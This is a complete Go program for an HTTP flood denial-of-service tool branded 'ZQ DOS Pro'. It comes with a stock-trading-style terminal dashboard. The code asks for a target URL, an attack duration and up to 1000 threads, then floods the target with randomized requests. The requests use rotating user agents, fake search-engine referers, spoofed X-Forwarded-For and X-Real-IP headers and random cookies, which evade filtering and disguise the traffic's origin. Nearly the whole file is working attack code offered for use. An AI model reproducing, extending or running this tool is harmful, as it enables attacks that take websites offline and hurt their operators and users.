package main

import (
	"bufio"
	"fmt"
	"math"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/corpix/uarand"
	"github.com/gookit/color"
)

var (
	referers = []string{
		"https://www.google.com/?q=",
		"https://www.google.co.uk/?q=",
		"https://www.google.de/?q=",
		"https://www.google.ru/?q=",
		"https://www.google.tk/?q=",
		"https://www.google.cn/?q=",
		"https://www.google.cf/?q=",
		"https://www.google.nl/?q=",
		"https://yandex.ru/search/?text=",
		"https://duckduckgo.com/?q=",
		"https://www.bing.com/search?q=",
		"https://search.yahoo.com/search?p=",
		"https://www.baidu.com/s?wd=",
		"https://search.naver.com/search.naver?query=",
	}
	
	host         string
	param_joiner string
	reqCount     uint64
	errorCount   uint64
	successCount uint64
	duration     time.Duration
	stopFlag     int32
	threads      int
	
	// Trading-style metrics
	rpsHistory    []float64
	maxRPS        float64
	minRPS        float64
	lastRPS       float64
	peakSuccess   uint64
	totalBytes    uint64
)

const (
	chartWidth  = 50
	chartHeight = 8
)

func clearScreen() {
	fmt.Print("\033[H\033[2J")
	fmt.Print("\033[H")
}

func printLine(char string, length int, colorFunc func(...interface{}) string) {
	line := strings.Repeat(char, length)
	fmt.Println(colorFunc(line))
}

func showVIPBanner() {
	clearScreen()
	
	printLine("═", 90, color.Cyan.Sprint)
	fmt.Println(color.BgMagenta.Sprint(color.White.Sprint("                              🔥 ULTRA PREMIUM VIP EDITION 🔥                              ")))
	
	fmt.Println()
	color.Red.Println("     ███████╗ ██████╗     ██████╗  ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ")
	color.Red.Println("     ╚══███╔╝██╔═══██╗    ██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗")
	color.Yellow.Println("       ███╔╝ ██║   ██║    ██║  ██║██║   ██║███████╗    ██████╔╝██████╔╝██║   ██║")
	color.Yellow.Println("      ███╔╝  ██║▄▄ ██║    ██║  ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██╗██║   ██║")
	color.Cyan.Println("     ███████╗╚██████╔╝    ██████╔╝╚██████╔╝███████║    ██║     ██║  ██║╚██████╔╝")
	color.Cyan.Println("     ╚══════╝ ╚══▀▀═╝     ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ")
	
	fmt.Println()
	fmt.Println(color.BgBlue.Sprint(color.White.Sprint("                           💎 PROFESSIONAL TRADING DASHBOARD 💎                          ")))
	
	fmt.Println()
	printLine("═", 90, color.Cyan.Sprint)
	fmt.Println()
	color.Magenta.Println("                        🌟 Developed by ZQ Team - Professional Edition 🌟")
	fmt.Println()
}

func getUserInput() {
	scanner := bufio.NewScanner(os.Stdin)
	
	for {
		color.Yellow.Print("🎯 Enter target URL: ")
		scanner.Scan()
		host = strings.TrimSpace(scanner.Text())
		
		if host == "" {
			color.Red.Println("❌ URL cannot be empty!")
			continue
		}
		
		if !strings.HasPrefix(host, "http://") && !strings.HasPrefix(host, "https://") {
			host = "https://" + host
		}
		
		color.Green.Printf("✅ Target set: %s\n\n", host)
		break
	}
	
	for {
		color.Yellow.Print("⏰ Enter attack duration (e.g., 30s, 5m, 1h): ")
		scanner.Scan()
		durationStr := strings.TrimSpace(scanner.Text())
		
		if durationStr == "" {
			color.Red.Println("❌ Duration cannot be empty!")
			continue
		}
		
		var err error
		duration, err = time.ParseDuration(durationStr)
		if err != nil || duration <= 0 {
			color.Red.Println("❌ Invalid duration format! Use: 30s, 5m, 1h")
			continue
		}
		
		color.Green.Printf("✅ Duration set: %v\n\n", duration)
		break
	}
	
	for {
		color.Yellow.Print("🚀 Enter number of threads (1-1000, recommended: 50-200): ")
		scanner.Scan()
		threadsStr := strings.TrimSpace(scanner.Text())
		
		if threadsStr == "" {
			threads = 100
			color.Blue.Println("ℹ️  Using default: 100 threads")
			break
		}
		
		var err error
		threads, err = strconv.Atoi(threadsStr)
		if err != nil || threads < 1 || threads > 1000 {
			color.Red.Println("❌ Invalid thread count! Use 1-1000")
			continue
		}
		
		color.Green.Printf("✅ Threads set: %d\n\n", threads)
		break
	}
}

func buildblock(size int) string {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func randomPayload() string {
	payloads := []string{
		buildblock(rand.Intn(10) + 5),
		fmt.Sprintf("search_%d", rand.Intn(999999)),
		fmt.Sprintf("query_%s", buildblock(rand.Intn(8) + 3)),
		fmt.Sprintf("data_%d_%s", rand.Intn(9999), buildblock(5)),
		fmt.Sprintf("param_%s", buildblock(rand.Intn(12) + 4)),
		fmt.Sprintf("id_%d", rand.Intn(999999)),
		fmt.Sprintf("token_%s", buildblock(rand.Intn(15) + 10)),
		fmt.Sprintf("session_%d_%s", rand.Intn(99999), buildblock(8)),
	}
	return payloads[rand.Intn(len(payloads))]
}

func getRandomHeaders() map[string]string {
	headers := map[string]string{
		"User-Agent":       uarand.GetRandom(),
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9,id;q=0.8",
		"Accept-Encoding": "gzip, deflate, br",
		"DNT":            "1",
		"Connection":     "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Pragma":         "no-cache",
		"Cache-Control":  "no-cache, no-store, must-revalidate, max-age=0",
		"Sec-Fetch-Dest": "document",
		"Sec-Fetch-Mode": "navigate",
		"Sec-Fetch-Site": "none",
	}
	
	if rand.Float32() < 0.8 {
		headers["Referer"] = referers[rand.Intn(len(referers))] + randomPayload()
	}
	
	if rand.Float32() < 0.6 {
		headers["X-Forwarded-For"] = fmt.Sprintf("%d.%d.%d.%d", 
			rand.Intn(255)+1, rand.Intn(255), rand.Intn(255), rand.Intn(255))
	}
	
	if rand.Float32() < 0.4 {
		headers["X-Real-IP"] = fmt.Sprintf("%d.%d.%d.%d", 
			rand.Intn(255)+1, rand.Intn(255), rand.Intn(255), rand.Intn(255))
	}
	
	return headers
}

func performRequest() {
	if strings.ContainsRune(host, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	c := http.Client{
		Timeout: time.Duration(rand.Intn(3000)+1500) * time.Millisecond,
	}

	url := fmt.Sprintf("%s%s%s=%s&%s=%s&%s=%s&t=%d&r=%d", 
		host, 
		param_joiner,
		randomPayload(), randomPayload(),
		randomPayload(), randomPayload(),
		randomPayload(), randomPayload(),
		time.Now().UnixNano(),
		rand.Intn(999999))

	method := "GET"
	if rand.Float32() < 0.1 {
		method = "POST"
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		atomic.AddUint64(&errorCount, 1)
		return
	}

	headers := getRandomHeaders()
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	if rand.Float32() < 0.3 {
		req.Header.Set("Cookie", fmt.Sprintf("session_id=%s; user_token=%s; _ga=%d", 
			buildblock(20), buildblock(15), rand.Intn(999999999)))
	}

	resp, err := c.Do(req)
	atomic.AddUint64(&reqCount, 1)

	if err != nil {
		atomic.AddUint64(&errorCount, 1)
	} else {
		atomic.AddUint64(&successCount, 1)
		if resp.Body != nil {
			atomic.AddUint64(&totalBytes, uint64(resp.ContentLength))
			resp.Body.Close()
		}
	}
}

func attackLoop() {
	for {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}
		
		for i := 0; i < rand.Intn(3)+1; i++ {
			if atomic.LoadInt32(&stopFlag) == 1 {
				return
			}
			performRequest()
		}
		
		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
	}
}

func drawMiniChart(data []float64, width, height int) string {
	if len(data) == 0 {
		return ""
	}
	
	// Get last 'width' data points
	start := 0
	if len(data) > width {
		start = len(data) - width
	}
	chartData := data[start:]
	
	if len(chartData) == 0 {
		return ""
	}
	
	// Find min and max
	minVal := chartData[0]
	maxVal := chartData[0]
	for _, v := range chartData {
		if v < minVal {
			minVal = v
		}
		if v > maxVal {
			maxVal = v
		}
	}
	
	if maxVal == minVal {
		maxVal = minVal + 1
	}
	
	// Create chart
	var chart strings.Builder
	
	// Draw chart from top to bottom
	for row := height - 1; row >= 0; row-- {
		threshold := minVal + (maxVal-minVal)*float64(row)/float64(height-1)
		
		for col := 0; col < len(chartData); col++ {
			if chartData[col] >= threshold {
				if chartData[col] > lastRPS {
					chart.WriteString(color.Green.Sprint("▓"))
				} else if chartData[col] < lastRPS {
					chart.WriteString(color.Red.Sprint("▓"))
				} else {
					chart.WriteString(color.Yellow.Sprint("▓"))
				}
			} else {
				chart.WriteString(color.Gray.Sprint("░"))
			}
		}
		chart.WriteString("\n")
	}
	
	return chart.String()
}

func formatBytes(bytes uint64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := uint64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

func getPercentageChange(current, previous float64) (float64, string) {
	if previous == 0 {
		return 0, "━"
	}
	change := ((current - previous) / previous) * 100
	
	var symbol string
	if change > 0 {
		symbol = "▲"
	} else if change < 0 {
		symbol = "▼"
	} else {
		symbol = "━"
	}
	
	return change, symbol
}

func showTradingDashboard(start time.Time) {
	requests := atomic.LoadUint64(&reqCount)
	errors := atomic.LoadUint64(&errorCount)
	success := atomic.LoadUint64(&successCount)
	bytes := atomic.LoadUint64(&totalBytes)
	elapsed := time.Since(start)
	currentRPS := float64(requests) / elapsed.Seconds()
	
	// Update RPS history
	rpsHistory = append(rpsHistory, currentRPS)
	if len(rpsHistory) > chartWidth {
		rpsHistory = rpsHistory[1:]
	}
	
	// Update metrics
	if currentRPS > maxRPS {
		maxRPS = currentRPS
	}
	if minRPS == 0 || currentRPS < minRPS {
		minRPS = currentRPS
	}
	if success > peakSuccess {
		peakSuccess = success
	}
	
	// Calculate changes
	rpsChange, rpsSymbol := getPercentageChange(currentRPS, lastRPS)
	lastRPS = currentRPS
	
	var successRate float64
	if requests > 0 {
		successRate = float64(success) / float64(requests) * 100
	}
	
	// Clear screen and redraw
	clearScreen()
	
	// Header
	printLine("═", 90, color.Cyan.Sprint)
	fmt.Println(color.BgBlue.Sprint(color.White.Sprint("                              💎 LIVE TRADING DASHBOARD 💎                              ")))
	printLine("═", 90, color.Cyan.Sprint)
	fmt.Println()
	
	// Market Overview Section
	color.Cyan.Println("┌─────────────────────────────── 📊 MARKET OVERVIEW ───────────────────────────────┐")
	
	// Time and Progress
	percentage := float64(elapsed) / float64(duration) * 100
	if percentage > 100 {
		percentage = 100
	}
	
	barLength := 60
	filledLength := int(percentage / 100 * float64(barLength))
	progressBar := "["
	for i := 0; i < barLength; i++ {
		if i < filledLength {
			progressBar += color.Green.Sprint("█")
		} else {
			progressBar += color.Gray.Sprint("░")
		}
	}
	progressBar += fmt.Sprintf("] %.1f%%", percentage)
	
	fmt.Printf("│ ⏰ Time Progress: %s\n", progressBar)
	fmt.Printf("│ 🎯 Target: %s\n", color.White.Sprint(host))
	fmt.Printf("│ ⏱️  Elapsed: %v / %v\n", 
		color.Cyan.Sprint(elapsed.Round(time.Second)), 
		color.Yellow.Sprint(duration))
	
	color.Cyan.Println("└───────────────────────────────────────────────────────────────────────────────┘")
	fmt.Println()
	
	// Live Statistics (like crypto ticker)
	color.Green.Println("┌──────────────────────────── 📈 LIVE STATISTICS (RPS) ─────────────────────────────┐")
	
	// Current RPS with change indicator
	var rpsColor func(...interface{}) string
	if rpsChange > 0 {
		rpsColor = color.Green.Sprint
	} else if rpsChange < 0 {
		rpsColor = color.Red.Sprint
	} else {
		rpsColor = color.Yellow.Sprint
	}
	
	fmt.Printf("│ Current RPS:  %s %s %s\n", 
		rpsColor(fmt.Sprintf("%.2f", currentRPS)),
		rpsColor(rpsSymbol),
		rpsColor(fmt.Sprintf("%.2f%%", math.Abs(rpsChange))))
	
	fmt.Printf("│ 24h High:     %s\n", color.Green.Sprint(fmt.Sprintf("%.2f", maxRPS)))
	fmt.Printf("│ 24h Low:      %s\n", color.Red.Sprint(fmt.Sprintf("%.2f", minRPS)))
	fmt.Printf("│ 24h Volume:   %s requests\n", color.Cyan.Sprint(fmt.Sprintf("%d", requests)))
	
	color.Green.Println("└───────────────────────────────────────────────────────────────────────────────┘")
	fmt.Println()
	
	// Chart
	color.Yellow.Println("┌──────────────────────────── 📊 RPS PERFORMANCE CHART ──────────────────────────────┐")
	
	chart := drawMiniChart(rpsHistory, chartWidth, chartHeight)
	chartLines := strings.Split(strings.TrimRight(chart, "\n"), "\n")
	for _, line := range chartLines {
		fmt.Printf("│ %s\n", line)
	}
	
	fmt.Printf("│ %s\n", strings.Repeat("─", chartWidth))
	fmt.Printf("│ Min: %s | Max: %s | Avg: %s\n",
		color.Red.Sprint(fmt.Sprintf("%.1f", minRPS)),
		color.Green.Sprint(fmt.Sprintf("%.1f", maxRPS)),
		color.Yellow.Sprint(fmt.Sprintf("%.1f", currentRPS)))
	
	color.Yellow.Println("└───────────────────────────────────────────────────────────────────────────────┘")
	fmt.Println()
	
	// Order Book Style Statistics
	color.Magenta.Println("┌──────────────────────── 📋 ORDER BOOK (REQUEST STATUS) ───────────────────────────┐")
	
	// Success side (like buy orders)
	fmt.Printf("│ %s (Success Rate: %.1f%%)%s│\n", 
		color.Green.Sprint("✅ SUCCESSFUL REQUESTS"),
		successRate,
		strings.Repeat(" ", 37))
	
	successBar := int(successRate / 2)
	fmt.Printf("│ %s%s │\n",
		color.Green.Sprint(strings.Repeat("█", successBar)),
		strings.Repeat(" ", 50-successBar))
	
	fmt.Printf("│ Success: %s%s│\n",
		color.Green.Sprint(fmt.Sprintf("%d", success)),
		strings.Repeat(" ", 64-len(fmt.Sprintf("%d", success))))
	
	fmt.Println("│" + strings.Repeat("─", 80) + "│")
	
	// Error side (like sell orders)
	errorRate := 100 - successRate
	fmt.Printf("│ %s (Error Rate: %.1f%%)%s│\n",
		color.Red.Sprint("❌ FAILED REQUESTS"),
		errorRate,
		strings.Repeat(" ", 41))
	
	errorBar := int(errorRate / 2)
	fmt.Printf("│ %s%s │\n",
		color.Red.Sprint(strings.Repeat("█", errorBar)),
		strings.Repeat(" ", 50-errorBar))
	
	fmt.Printf("│ Errors: %s%s│\n",
		color.Red.Sprint(fmt.Sprintf("%d", errors)),
		strings.Repeat(" ", 65-len(fmt.Sprintf("%d", errors))))
	
	color.Magenta.Println("└───────────────────────────────────────────────────────────────────────────────┘")
	fmt.Println()
	
	// Portfolio Summary
	color.Cyan.Println("┌─────────────────────────── 💼 PORTFOLIO SUMMARY ──────────────────────────────────┐")
	
	fmt.Printf("│ Total Requests:   %s%s│\n",
		color.White.Sprint(fmt.Sprintf("%d", requests)),
		strings.Repeat(" ", 60-len(fmt.Sprintf("%d", requests))))
	
	fmt.Printf("│ Data Transferred: %s%s│\n",
		color.White.Sprint(formatBytes(bytes)),
		strings.Repeat(" ", 60-len(formatBytes(bytes))))
	
	fmt.Printf("│ Active Threads:   %s%s│\n",
		color.White.Sprint(fmt.Sprintf("%d", threads)),
		strings.Repeat(" ", 60-len(fmt.Sprintf("%d", threads))))
	
	fmt.Printf("│ Peak Success:     %s%s│\n",
		color.Green.Sprint(fmt.Sprintf("%d", peakSuccess)),
		strings.Repeat(" ", 60-len(fmt.Sprintf("%d", peakSuccess))))
	
	color.Cyan.Println("└───────────────────────────────────────────────────────────────────────────────┘")
	
	fmt.Println()
	color.Gray.Println("💡 Press Ctrl+C to stop the attack | 🔄 Auto-refresh: 100ms")
}

func main() {
	rand.Seed(time.Now().UnixNano())
	
	showVIPBanner()
	
	color.Cyan.Println("🎮 Welcome to ZQ DOS Professional Trading Edition!")
	color.Yellow.Println("📝 Please provide the following information:")
	fmt.Println()
	
	getUserInput()
	
	color.Yellow.Println("🔄 Initializing Professional Trading Systems...")
	
	loadingSteps := []string{
		"🔧 Loading Trading Modules",
		"📊 Initializing Chart Engine",
		"⚙️  Configuring Dashboard",
		"🚀 Optimizing Performance",
		"💎 Activating Analytics",
		"🎯 Preparing Market Data",
		"✅ System Ready",
	}
	
	for _, step := range loadingSteps {
		fmt.Print("  " + step)
		for i := 0; i < 3; i++ {
			time.Sleep(200 * time.Millisecond)
			fmt.Print(".")
		}
		fmt.Println(" ✓")
		time.Sleep(150 * time.Millisecond)
	}
	
	fmt.Println()
	color.Green.Println("🚀 Opening Trading Session...")
	time.Sleep(1 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		atomic.StoreInt32(&stopFlag, 1)
	}()

	for i := 0; i < threads; i++ {
		go attackLoop()
		time.Sleep(10 * time.Millisecond)
	}

	dashboardTicker := time.NewTicker(100 * time.Millisecond)
	defer dashboardTicker.Stop()

	go func() {
		for range dashboardTicker.C {
			if atomic.LoadInt32(&stopFlag) == 1 {
				return
			}
			showTradingDashboard(start)
		}
	}()

	time.Sleep(duration)
	atomic.StoreInt32(&stopFlag, 1)
	time.Sleep(1 * time.Second)
	
	// Final Report
	clearScreen()
	printLine("═", 90, color.Green.Sprint)
	fmt.Println(color.BgGreen.Sprint(color.Black.Sprint("                           🏆 TRADING SESSION COMPLETED 🏆                            ")))
	printLine("═", 90, color.Green.Sprint)
	
	fmt.Println()
	
	totalReq := atomic.LoadUint64(&reqCount)
	totalSuccess := atomic.LoadUint64(&successCount)
	totalErrors := atomic.LoadUint64(&errorCount)
	totalTime := time.Since(start)
	avgRPS := float64(totalReq) / totalTime.Seconds()
	successRate := float64(totalSuccess) / float64(totalReq) * 100
	totalDataTransfer := atomic.LoadUint64(&totalBytes)
	
	color.Cyan.Println("┌───────────────────────── 📊 FINAL TRADING REPORT 📊 ──────────────────────────┐")
	color.Cyan.Printf("│ 🎯 Target: %-67s │\n", host)
	color.Cyan.Println("├────────────────────────────────────────────────────────────────────────────────┤")
	color.Cyan.Printf("│ 📨 Total Volume:      %-8d requests                                       │\n", totalReq)
	color.Cyan.Printf("│ ✅ Successful:        %-8d (%.1f%%)                                       │\n", totalSuccess, successRate)
	color.Cyan.Printf("│ ❌ Failed:            %-8d (%.1f%%)                                       │\n", totalErrors, 100-successRate)
	color.Cyan.Println("├────────────────────────────────────────────────────────────────────────────────┤")
	color.Cyan.Printf("│ ⏱️  Session Duration:  %-8v                                               │\n", totalTime.Round(time.Second))
	color.Cyan.Printf("│ ⚡ Average RPS:       %-8.1f req/sec                                       │\n", avgRPS)
	color.Cyan.Printf("│ 🔝 Peak RPS:          %-8.1f req/sec                                       │\n", maxRPS)
	color.Cyan.Printf("│ 📉 Low RPS:           %-8.1f req/sec                                       │\n", minRPS)
	color.Cyan.Println("├────────────────────────────────────────────────────────────────────────────────┤")
	color.Cyan.Printf("│ 📊 Data Transferred:  %-8s                                                │\n", formatBytes(totalDataTransfer))
	color.Cyan.Printf("│ 🚀 Threads Used:      %-8d workers                                        │\n", threads)
	color.Cyan.Println("└────────────────────────────────────────────────────────────────────────────────┘")
	
	fmt.Println()
	
	var rating string
	var ratingColor func(...interface{}) string
	
	if avgRPS > 1000 {
		rating = "🔥 LEGENDARY PERFORMANCE"
		ratingColor = color.Red.Sprint
	} else if avgRPS > 500 {
		rating = "💎 DIAMOND TIER"
		ratingColor = color.Magenta.Sprint
	} else if avgRPS > 200 {
		rating = "⭐ PLATINUM LEVEL"
		ratingColor = color.Yellow.Sprint
	} else if avgRPS > 100 {
		rating = "✅ GOLD STANDARD"
		ratingColor = color.Green.Sprint
	} else {
		rating = "📊 SILVER GRADE"
		ratingColor = color.Cyan.Sprint
	}
	
	fmt.Printf("  🏆 Performance Grade: %s\n", ratingColor(rating))
	fmt.Println()
	
	fmt.Println(color.BgMagenta.Sprint(color.White.Sprint("                       🌟 THANK YOU FOR TRADING WITH ZQ DOS PRO 🌟                     ")))
	color.Magenta.Println("                              💎 Professional Edition 💎")
	
	fmt.Println()
	printLine("═", 90, color.Cyan.Sprint)
}
